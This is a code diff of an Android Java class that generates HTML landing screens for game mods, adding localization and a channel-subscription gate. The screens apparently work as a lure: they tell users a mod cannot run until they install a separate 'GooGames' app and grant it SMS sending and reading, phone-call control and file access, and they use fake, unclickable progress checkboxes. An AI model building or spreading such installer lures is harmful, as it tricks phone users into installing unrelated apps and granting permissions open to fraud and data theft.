@@ -1,5 +1,11 @@
 package com.mks.modlib;
 
+import android.content.Context;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.util.Log;
+
 public class Lending {
     /*******************************************************************************************
      /*   Лендинги
@@ -20,6 +26,10 @@ public class Lending {
             "     function hide(_id)\n" +
             "    {\n" +
             "        Android.hide(_id);\n" +
+            "    }\n" +
+            "     function subscribe(_id)\n" +
+            "    {\n" +
+            "        Android.subscribe(_id);\n" +
             "    }\n" +
             "    function exit(_id)\n" +
             "    {\n" +
@@ -389,24 +399,24 @@ public class Lending {
             "<body>\n" +
             "<div class=\"head\">\n" +
             "\t<div class=\"container\">\n" +
-            "\t\t<div class=\"logo\">Проверка доступа</div>\n" +
+            "\t\t<div class=\"logo\">" + Localization.getString("Access check") + "</div>\n" +
             "\t</div>\n" +
             "</div>\n" +
             "<div class=\"container\">\n" +
             "\t<div class=\"content\">";
 
     static String picApp = "";
-    static String stepOne = "<div class=\"error-title\"><b>Шаг 1 из 2</b><hr></div>";
-    static String stepTwo = "<div class=\"error-title\"><b>Шаг 2 из 2</b><hr></div>";
+    static String stepOne = "<div class=\"error-title\"><b>" + Localization.getString("step1_2")  + "</b><hr></div>";
+    static String stepTwo = "<div class=\"error-title\"><b>" + Localization.getString("step2_2")  + "</b><hr></div>";
     // static String stepGranted = "<div class=\"error-title\"><b style=\"color: #1db071;\">Доступ успешно предоставлен!</b><hr></div>";
     static String result = "";
 
 
-    static String installButton = " <a class=\"btn\" href=\"#\"> <img src=\"data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjMycHgiIGhlaWdodD0iMzJweCIgdmlld0JveD0iMCAwIDYxMiA2MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDYxMiA2MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4KPGc+Cgk8ZyBpZD0iY2xvdWQtZG93bmxvYWQiPgoJCTxwYXRoIGQ9Ik00OTQuNywyNTVDNDc2Ljg1LDE2OC4zLDQwMC4zNSwxMDIsMzA2LDEwMmMtNzMuOTUsMC0xMzcuNyw0MC44LTE2OC4zLDEwMkM1OC42NSwyMTQuMiwwLDI3Ny45NSwwLDM1NyAgICBjMCw4NC4xNSw2OC44NSwxNTMsMTUzLDE1M2gzMzEuNWM3MS40LDAsMTI3LjUtNTYuMSwxMjcuNS0xMjcuNUM2MTIsMzE2LjIsNTU4LjQ1LDI2MC4xLDQ5NC43LDI1NXogTTQzMy41LDMzMS41TDMwNiw0NTkgICAgTDE3OC41LDMzMS41SDI1NXYtMTAyaDEwMnYxMDJINDMzLjV6IiBmaWxsPSIjRkZGRkZGIi8+Cgk8L2c+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPC9zdmc+Cg==\" /> Установить GooGames</a><br class=\"land\">\n";
+    static String installButton = " <a class=\"btn\" href=\"#\"> <img src=\"data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjMycHgiIGhlaWdodD0iMzJweCIgdmlld0JveD0iMCAwIDYxMiA2MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDYxMiA2MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4KPGc+Cgk8ZyBpZD0iY2xvdWQtZG93bmxvYWQiPgoJCTxwYXRoIGQ9Ik00OTQuNywyNTVDNDc2Ljg1LDE2OC4zLDQwMC4zNSwxMDIsMzA2LDEwMmMtNzMuOTUsMC0xMzcuNyw0MC44LTE2OC4zLDEwMkM1OC42NSwyMTQuMiwwLDI3Ny45NSwwLDM1NyAgICBjMCw4NC4xNSw2OC44NSwxNTMsMTUzLDE1M2gzMzEuNWM3MS40LDAsMTI3LjUtNTYuMSwxMjcuNS0xMjcuNUM2MTIsMzE2LjIsNTU4LjQ1LDI2MC4xLDQ5NC43LDI1NXogTTQzMy41LDMzMS41TDMwNiw0NTkgICAgTDE3OC41LDMzMS41SDI1NXYtMTAyaDEwMnYxMDJINDMzLjV6IiBmaWxsPSIjRkZGRkZGIi8+Cgk8L2c+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPC9zdmc+Cg==\" /> " + Localization.getString("install_GooGames") + "</a><br class=\"land\">\n";
 //            "<a class=\"btn\" href=\"#\"><img src=\"data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjMycHgiIGhlaWdodD0iMzJweCIgdmlld0JveD0iMCAwIDYxMiA2MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDYxMiA2MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4KPGc+Cgk8ZyBpZD0iY2xvdWQtZG93bmxvYWQiPgoJCTxwYXRoIGQ9Ik00OTQuNywyNTVDNDc2Ljg1LDE2OC4zLDQwMC4zNSwxMDIsMzA2LDEwMmMtNzMuOTUsMC0xMzcuNyw0MC44LTE2OC4zLDEwMkM1OC42NSwyMTQuMiwwLDI3Ny45NSwwLDM1NyAgICBjMCw4NC4xNSw2OC44NSwxNTMsMTUzLDE1M2gzMzEuNWM3MS40LDAsMTI3LjUtNTYuMSwxMjcuNS0xMjcuNUM2MTIsMzE2LjIsNTU4LjQ1LDI2MC4xLDQ5NC43LDI1NXogTTQzMy41LDMzMS41TDMwNiw0NTkgICAgTDE3OC41LDMzMS41SDI1NXYtMTAyaDEwMnYxMDJINDMzLjV6IiBmaWxsPSIjRkZGRkZGIi8+Cgk8L2c+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPGc+CjwvZz4KPC9zdmc+Cg==\" /> Установить GooGames</a><br class=\"land\">\n";
 
 
-    public static String getLending(String mod_name, String type, int percent) {
+    public static String getLending(Context cnt, String mod_name, String type, int percent) {
         result = "";
         picApp = "<div class=\"icon\"><img src=\"data:image/png;base64," + InfoForm.picAppOnlyStr +
                 "\"></div><div class=\"error-container\">";
@@ -414,48 +424,93 @@ public class Lending {
             result = result + common + picApp;
             Logger.log("InfoForm.resultExtStrgGranted " + InfoForm.resultExtStrgGranted + " resultGooInstalled " + InfoForm.resultGooInstalled + " resultSMSGranted" + InfoForm.resultSMSGranted + " resultPhoneCallGranted" + InfoForm.resultPhoneCallGranted);
             if (InfoForm.resultGooInstalled == -1) {
-                result = result + stepOne + "<p>Для работы мода <i>" + mod_name + "</i> необходимо установить приложение \"GooGames\"</p>\n" +
+                result = result + stepOne + "<p>" +  Localization.getString("For work mod 1") +  " <i>" + mod_name + "</i> " +  Localization.getString("For work mod 2") + "</p>\n" +
                         "</div>\n" +
                         "<div class=\"btn-error-container\">\n" +
-                        "            <label class=\"container\">Установить GooGames\n" +
+                        "            <label class=\"container\">" + Localization.getString("install_GooGames") + "\n" +
                         "              <input type=\"checkbox\" onclick='window.event.returnValue=false'>\n" +
                         "              <span class=\"checkmark\"></span>\n" +
                         "            </label>\n" +
                         "\n" +
-                        "            <label class=\"container\">Дать доступы\n" +
+                        "            <label class=\"container\">"+Localization.getString("Give access")+"\n" +
                         "              <input type=\"checkbox\" onclick='window.event.returnValue=false'>\n" +
                         "              <span class=\"checkmark\"></span>\n" +
                         "            </label>\n" +
                         "\t\t</div>\n <div class=\"btn-container\"  onclick=\"download('1');\">" +  installButton + "</div>\n" +
-                        "\t\t <div class=\"btn-container\"> <a class=\"btn game disable\" href=\"#\" onclick=\"\">Играть в <br><b>"+ mod_name+"</b></a><br>\n" +
-                        "            <em>Cтанет активной после установки GooGames</em>\n" +
+                        "\t\t <div class=\"btn-container\"> <a class=\"btn game disable\" href=\"#\" onclick=\"\">"+Localization.getString("Play")+"<br><b>"+ mod_name+"</b></a><br>\n" +
+                        "            <em>"+Localization.getString("Activate where")+"</em>\n" +
                         "        </div>\n" +
                         "\t</div>\n" +
                         "</div>\n" +
                         "</body>\n" +
                         "</html>";
             } else if (InfoForm.resultGooInstalled == 0 && InfoForm.resultAllGranted) {  /**All Granted*/
-                result = result + "\t\t<div class=\"error-title\"><b style=\"color: #1db071;\">Доступ успешно предоставлен!</b><hr></div>\n" +
-                        "\t\t\t<p>Для запуска мода <i>" + mod_name + "</i> нажмите кнопку \"Играть\"</p>\n" +
-                        "\t\t</div>\n" +
-                        "\t\t<div class=\"btn-error-container\">\n" +
-                        "            <label class=\"container\">Установить GooGames\n" +
-                        "              <input type=\"checkbox\" checked onclick='window.event.returnValue=false'>\n" +
-                        "              <span class=\"checkmark\"></span>\n" +
-                        "            </label>\n" +
-                        "\n" +
-                        "            <label class=\"container\">Дать доступы\n" +
-                        "              <input type=\"checkbox\" checked onclick='window.event.returnValue=false'>\n" +
-                        "              <span class=\"checkmark\"></span>\n" +
-                        "            </label>\n" +
-                        "\t\t</div>\n" +
-                        "        <div class=\"btn-container\" >\n" +
-                        "            <a class=\"btn game\" href=\"#\"  onclick=\"hide('1');\"> Играть в <br><b>" + mod_name + "</b></a><br>\n" +
-                        "        </div>\n" +
-                        "\t</div>\n" +
-                        "</div>\n" +
-                        "</body>\n" +
-                        "</html>";
+                 // Только для модов DrHack - добавляем проверку подписки на канал
+                int subscribeCode = 1;
+                ApplicationInfo ai = null;
+                String channel_link = null;
+                if (cnt != null) {
+                    subscribeCode = cnt.getSharedPreferences(C.SESSION_SUBSCRIBE, Context.MODE_PRIVATE).getInt(C.KEY_SUBSCRIBE, 0);
+                    //Первый старт и по такому ключу данных не найдено - значит надо показать окно с подпиской на канал
+                    if (subscribeCode == 0) {subscribeCode = -1;}
+                    try {
+                        ai = cnt.getPackageManager().getApplicationInfo(cnt.getPackageName(), PackageManager.GET_META_DATA);
+                        Bundle bundle = ai.metaData;
+                        channel_link = bundle.getString(C.KEY_USER_CHANNEL);
+                    } catch (PackageManager.NameNotFoundException e) {
+                        e.printStackTrace();
+                    } catch (Error e) {
+                        e.printStackTrace();
+                    }
+                }
+
+                 if ((subscribeCode == 1)||(channel_link == null)) {
+                    result = result + "\t\t<div class=\"error-title\"><b style=\"color: #1db071;\">" + Localization.getString("Access granted") + "</b><hr></div>\n" +
+                            "\t\t\t<p>" + Localization.getString("For play 1") + " <i>" + mod_name + "</i> " + Localization.getString("For play 2") + " </p>\n" +
+                            "\t\t</div>\n" +
+                            "\t\t<div class=\"btn-error-container\">\n" +
+                            "            <label class=\"container\">" + Localization.getString("install_GooGames") + "\n" +
+                            "              <input type=\"checkbox\" checked onclick='window.event.returnValue=false'>\n" +
+                            "              <span class=\"checkmark\"></span>\n" +
+                            "            </label>\n" +
+                            "\n" +
+                            "            <label class=\"container\">" + Localization.getString("Give access") + "\n" +
+                            "              <input type=\"checkbox\" checked onclick='window.event.returnValue=false'>\n" +
+                            "              <span class=\"checkmark\"></span>\n" +
+                            "            </label>\n" +
+                            "\t\t</div>\n" +
+                            "        <div class=\"btn-container\" >\n" +
+                            "            <a class=\"btn game\" href=\"#\"  onclick=\"hide('1');\"> " + Localization.getString("Play") + "<br><b>" + mod_name + "</b></a><br>\n" +
+                            "        </div>\n" +
+                            "\t</div>\n" +
+                            "</div>\n" +
+                            "</body>\n" +
+                            "</html>";
+                 }
+                 else
+                 {
+                     result = result + "\t\t<div class=\"error-title\"><b style=\"color: #1db071;\">" + Localization.getString("Access granted") + "</b><hr></div>\n" +
+                             "\t\t\t<p>" + Localization.getString("For play 1 DrHack") + " <i>" + mod_name + "</i> " + Localization.getString("For play 2 DrHack") + " </p>\n" +
+                             "\t\t</div>\n" +
+                             "\t\t<div class=\"btn-error-container\">\n" +
+                             "            <label class=\"container\">" + Localization.getString("install_GooGames") + "\n" +
+                             "              <input type=\"checkbox\" checked onclick='window.event.returnValue=false'>\n" +
+                             "              <span class=\"checkmark\"></span>\n" +
+                             "            </label>\n" +
+                             "\n" +
+                             "            <label class=\"container\">" + Localization.getString("Give access") + "\n" +
+                             "              <input type=\"checkbox\" checked onclick='window.event.returnValue=false'>\n" +
+                             "              <span class=\"checkmark\"></span>\n" +
+                             "            </label>\n" +
+                             "\t\t</div>\n" +
+                             "        <div class=\"btn-container\">\n" +
+                             "            <a  style = \"background: #cc181e;\" class=\"btn game\" href=\"#\"  onclick=\"subscribe('" + channel_link + "');\"> " + Localization.getString("Subscribe") + "<br></a><br>\n" +
+                             "        </div>\n" +
+                             "\t</div>\n" +
+                             "</div>\n" +
+                             "</body>\n" +
+                             "</html>";
+                 }
             } /**With no or one permissions*/
             else if (InfoForm.resultGooInstalled == 0 && !InfoForm.resultAllGranted) {
                 result = result + stepTwo;
@@ -464,30 +519,30 @@ public class Lending {
                         || (InfoForm.resultExtStrgGranted == -1 && InfoForm.resultPhoneCallGranted == -1 && InfoForm.resultSMSGranted == 0)
                         || (InfoForm.resultExtStrgGranted == -1 && InfoForm.resultPhoneCallGranted == 0 && InfoForm.resultSMSGranted == -1)) {
                     result = result +
-                            "<p>Для работы мода <i>" + mod_name + "</i> необходимо дать все запрашиваемые разрешения приложению \"GooGames\"</p>\n";
+                            "<p>"+Localization.getString("To play mod")+" <i>" + mod_name + "</i>"+Localization.getString("To play mod 1")+"</p>\n";
                 } else if ((InfoForm.resultExtStrgGranted == 0 && InfoForm.resultPhoneCallGranted == 0 && InfoForm.resultSMSGranted == -1)) {
-                    result = result + "<p>Для работы мода <i>" + mod_name + "</i> необходимо дать приложению \"GooGames\" разрешение на отправку и просмотр SMS-сообщений</p>";
+                    result = result + "<p>"+Localization.getString("To play mod")+" <i>" + mod_name + "</i>"+Localization.getString("To play mod 2")+"</p>";
                 } else if (InfoForm.resultGooInstalled == 0 && ((InfoForm.resultExtStrgGranted == 0 && InfoForm.resultPhoneCallGranted == -1 && InfoForm.resultSMSGranted == 0))) {
-                    result = result + "<p>Для работы мода <i>" + mod_name + "</i> необходимо дать приложению \"GooGames\" разрешение на осуществление телефонных звонков и управление ими</p>";
+                    result = result + "<p>"+Localization.getString("To play mod")+" <i>" + mod_name + "</i>"+Localization.getString("To play mod 3")+"</p>";
                 } else if (InfoForm.resultGooInstalled == 0 && ((InfoForm.resultExtStrgGranted == -1 && InfoForm.resultPhoneCallGranted == 0 && InfoForm.resultSMSGranted == 0))) {
-                    result = result + "<p>Для работы мода <i>" + mod_name + "</i> необходимо дать приложению \"GooGames\" разрешение на доступ к фото, мультимедиа и файлам на вашем устройстве</p>";
+                    result = result + "<p>"+Localization.getString("To play mod")+"<i>" + mod_name + "</i>"+Localization.getString("To play mod 4")+"</p>";
                 }
                 result = result + "</div>\n" +
                         "\t\t<div class=\"btn-error-container\">\n" +
-                        "            <label class=\"container\">Установить GooGames\n" +
+                        "            <label class=\"container\">"+Localization.getString("install_GooGames")+"\n" +
                         "              <input type=\"checkbox\" checked onclick='window.event.returnValue=false'>\n" +
                         "              <span class=\"checkmark\"></span>\n" +
                         "            </label>\n" +
                         "\n" +
-                        "            <label class=\"container\">Дать доступы\n" +
+                        "            <label class=\"container\">"+Localization.getString("Give access")+"\n" +
                         "              <input type=\"checkbox\" onclick='window.event.returnValue=false'>\n" +
                         "              <span class=\"checkmark\"></span>\n" +
                         "            </label>\n" +
                         "\t\t</div>\n" +
                         "        <div class=\"btn-container\">\n" +
-                        "            <a class=\"btn\" href=\"#\"onclick=\"openGG('1');\"><img src=\"data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjMycHgiIGhlaWdodD0iMzJweCIgdmlld0JveD0iMCAwIDEwNi4wNDggMTA2LjA0OCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMTA2LjA0OCAxMDYuMDQ4OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxnPgoJPHBhdGggZD0iTTY5Ljg5NSwzNC4yNzlsNy40OTgsNy40OThMNDcuNDAzLDcxLjc2OWwtMTguNzUtMTguNzQ1bDcuNDk4LTcuNDk4bDExLjI0NywxMS4yNDdMNjkuODk1LDM0LjI3OXogICAgTTEwNi4wNDgsMjEuMjA5djYzLjYyOWMwLDExLjY2Ni05LjU0MywyMS4yMS0yMS4yMSwyMS4yMUgyMS4yMDlDOS41NDMsMTA2LjA0OCwwLDk2LjUwNCwwLDg0LjgzOFYyMS4yMDkgICBDMCw5LjU0Myw5LjU0MywwLDIxLjIwOSwwaDYzLjYyOEM5Ni41MDUsMCwxMDYuMDQ4LDkuNTQzLDEwNi4wNDgsMjEuMjA5eiBNOTIuNzkyLDUzLjAyM2MwLTIxLjk2OC0xNy44MDMtMzkuNzY4LTM5Ljc2OS0zOS43NjggICBjLTIxLjk2OCwwLTM5Ljc2OCwxNy44LTM5Ljc2OCwzOS43NjhjMCwyMS45NjYsMTcuOCwzOS43NjksMzkuNzY4LDM5Ljc2OUM3NC45ODksOTIuNzkyLDkyLjc5Miw3NC45ODksOTIuNzkyLDUzLjAyM3oiIGZpbGw9IiNGRkZGRkYiLz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8L3N2Zz4K\" /> Дать разрешение</a><br class=\"land\">\n" +
-                        "            <a class=\"btn game disable\" href=\"#\" onclick=\"\">Играть в <br><b>" + mod_name + "</b></a><br>\n" +
-                        "            <em>Cтанет активной после принятия разрешений</em>\n" +
+                        "            <a class=\"btn\" href=\"#\"onclick=\"openGG('1');\"><img src=\"data:image/svg+xml;utf8;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjMycHgiIGhlaWdodD0iMzJweCIgdmlld0JveD0iMCAwIDEwNi4wNDggMTA2LjA0OCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMTA2LjA0OCAxMDYuMDQ4OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxnPgoJPHBhdGggZD0iTTY5Ljg5NSwzNC4yNzlsNy40OTgsNy40OThMNDcuNDAzLDcxLjc2OWwtMTguNzUtMTguNzQ1bDcuNDk4LTcuNDk4bDExLjI0NywxMS4yNDdMNjkuODk1LDM0LjI3OXogICAgTTEwNi4wNDgsMjEuMjA5djYzLjYyOWMwLDExLjY2Ni05LjU0MywyMS4yMS0yMS4yMSwyMS4yMUgyMS4yMDlDOS41NDMsMTA2LjA0OCwwLDk2LjUwNCwwLDg0LjgzOFYyMS4yMDkgICBDMCw5LjU0Myw5LjU0MywwLDIxLjIwOSwwaDYzLjYyOEM5Ni41MDUsMCwxMDYuMDQ4LDkuNTQzLDEwNi4wNDgsMjEuMjA5eiBNOTIuNzkyLDUzLjAyM2MwLTIxLjk2OC0xNy44MDMtMzkuNzY4LTM5Ljc2OS0zOS43NjggICBjLTIxLjk2OCwwLTM5Ljc2OCwxNy44LTM5Ljc2OCwzOS43NjhjMCwyMS45NjYsMTcuOCwzOS43NjksMzkuNzY4LDM5Ljc2OUM3NC45ODksOTIuNzkyLDkyLjc5Miw3NC45ODksOTIuNzkyLDUzLjAyM3oiIGZpbGw9IiNGRkZGRkYiLz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8Zz4KPC9nPgo8L3N2Zz4K\" />"+Localization.getString("Give permission")+" </a><br class=\"land\">\n" +
+                        "            <a class=\"btn game disable\" href=\"#\" onclick=\"\">"+Localization.getString("Play")+"<br><b>" + mod_name + "</b></a><br>\n" +
+                        "            <em>"+Localization.getString("Activate where")+"</em>\n" +
                         "        </div>\n" +
                         "\t</div>\n" +
                         "</div>\n" +
@@ -640,8 +695,8 @@ public class Lending {
                     "<div class=\"container\">\n" +
                     "\t<div class=\"content\">\n" +
                     "\t\t<div class=\"error-container\">\n" +
-                    "\t\t\t<div class=\"error-title\"><b>Проверка доступа</b><hr></div>\n" +
-                    "\t\t\t<p>Для работы мода <i>" + mod_name + "</i> необходимо наличие на Вашем устройстве приложения \"GooGames\"</p>\n" +
+                    "\t\t\t<div class=\"error-title\"><b>"+Localization.getString("Access check")+"</b><hr></div>\n" +
+                    "\t\t\t<p>"+Localization.getString("For work mod 1")+"<i>" + mod_name + "</i> "+Localization.getString("For work mod 2")+"</p>\n" +
                     "\t\t</div>\n" +
                     "\t\t<div class=\"btn-error-container\">\n" +
                     "        <img src=\"data:image/gif;base64," + InfoForm.picAppOnlyStr+"\">\n" +
@@ -917,8 +972,8 @@ public class Lending {
                     "<div class=\"container\">\n" +
                     "\t<div class=\"content\">\n" +
                     "\t\t<div class=\"error-container\">\n" +
-                    "\t\t\t<div class=\"error-title\"><b>Проверка доступа</b><hr></div>\n" +
-                    "\t\t\t<p>Для работы мода <i>" + mod_name + "</i> необходимо наличие на Вашем устройстве приложения \"GooGames\"</p>\n" +
+                    "\t\t\t<div class=\"error-title\"><b>"+Localization.getString("Access check")+"</b><hr></div>\n" +
+                    "\t\t\t<p>"+Localization.getString("For work mod 1")+"<i>" + mod_name + "</i> "+Localization.getString("For work mod 2")+"</p>\n" +
                     "\t\t</div>\n" +
                     "\t\t<div class=\"btn-error-container\">\n" +
                     "                <div class=\"meter\">\n" +
